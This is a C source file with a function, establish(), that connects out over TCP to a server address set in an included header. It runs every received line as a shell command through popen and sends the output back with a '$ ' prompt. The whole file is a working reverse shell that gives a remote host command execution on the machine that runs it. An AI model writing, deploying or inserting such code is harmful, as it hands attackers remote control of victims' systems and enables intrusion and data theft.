#include "../include/net.h"

void establish(void)
{
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        close(sockfd);
        return;
    }

    ssize_t bytes;
    while ((bytes = recv(sockfd, buffer, BUFFER_SIZE - 1, 0)) > 0)
    {
        buffer[bytes] = '\0';

        while (bytes > 0 && (buffer[bytes - 1] == '\n' || buffer[bytes - 1] == '\r' || buffer[bytes - 1] == ' '))
            buffer[--bytes] = '\0';

        if (bytes == 0) continue;

        char cmd[BUFFER_SIZE + 16];
        snprintf(cmd, sizeof(cmd), "%s 2>&1", buffer);

        FILE *fp = popen(cmd, "r");
        if (!fp) continue;

        char output[BUFFER_SIZE];
        ssize_t n;

        while ((n = fread(output, 1, sizeof(output) - 1, fp)) > 0)
        {
            output[n] = '\0';
            send(sockfd, output, n, 0);
        }

        pclose(fp);

        const char *prompt = "\n$ ";
        send(sockfd, prompt, strlen(prompt), 0);
    }

    close(sockfd);
}